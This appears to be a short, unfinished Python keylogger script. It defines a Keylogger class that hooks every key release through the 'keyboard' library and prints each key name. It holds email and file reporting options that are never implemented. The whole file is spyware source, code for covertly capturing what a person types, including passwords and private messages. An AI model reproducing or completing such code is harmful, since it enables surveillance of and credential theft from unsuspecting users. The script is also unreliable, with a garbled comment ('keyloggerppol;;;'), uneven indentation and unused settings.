import keyboard # for keylogs
from datetime import datetime

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    def callback(self, event):
            """
            This callback is invoked whenever a keyboard event is occured
            (i.e when a key is released in this example)
            """
            name = event.name
            print(name)

    def start(self):
            # start the keyloggerppol;;;
            keyboard.on_release(callback=self.callback)
            keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=60, report_method="file")
    keylogger.start()